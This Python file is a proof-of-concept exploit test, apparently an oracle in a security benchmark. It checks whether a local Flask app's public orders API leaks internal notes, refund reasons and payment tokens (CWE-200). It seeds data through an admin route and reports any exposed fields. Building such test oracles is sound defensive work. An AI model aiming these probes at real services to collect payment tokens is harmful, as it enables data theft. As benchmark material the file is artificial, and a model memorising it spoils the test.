"""PoC exploit: 3-stage order data leak: (1) add Order model with internal fields (internal_note... (CWE-200)."""

from mosaic.oracle.exploit import ExploitTest


class OrderQueryAllExploit(ExploitTest):
    """Order data leak: internal_notes, refund_reason, payment_token exposed in public API."""

    def __init__(self, base_url: str = "http://localhost:5205"):
        super().__init__(base_url)

    @property
    def chain_id(self) -> str:
        return "flask_query_all_orders"

    def setup(self) -> None:
        """Seed the database."""
        self.http_get("/admin/orders/seed")

    def execute(self) -> tuple[bool, str]:
        """Fetch public endpoint and check for internal fields."""
        resp = self.http_get("/api/orders/")

        if resp.status_code == 404:
            return False, "Endpoint returned 404."

        if not resp.ok:
            return False, f"HTTP {resp.status_code}: {resp.text[:200]}"

        try:
            data = resp.json()
        except Exception:
            return False, f"Could not parse JSON: {resp.text[:200]}"

        if isinstance(data, list):
            items = data
        elif isinstance(data, dict):
            items = data.get("items", data.get("data", data.get("results", [])))
        else:
            items = []
        if not items:
            # Try single item
            resp2 = self.http_get("/api/orders/1")
            if resp2.ok:
                try:
                    d2 = resp2.json()
                    if isinstance(d2, dict):
                        item = d2.get("item", d2)
                    else:
                        item = d2
                    if isinstance(item, dict):
                        items = [item]
                    elif isinstance(item, list):
                        items = item
                except Exception:
                    pass

        if not items:
            return False, "No items in response."

        found = []
        for item in items:
            if not isinstance(item, dict):
                continue
            for field in ['internal_notes', 'refund_reason', 'payment_token']:
                val = item.get(field)
                if val is not None and val != "":
                    found.append(f"{field}={str(val)[:60]}")
            if found:
                break

        if found:
            return True, (
                f"Internal data leaked (CWE-200). "
                f"Fields exposed: {', '.join(found)}"
            )

        sample_keys = list(items[0].keys()) if items else []
        return False, f"No internal fields found. Keys: {sample_keys}"
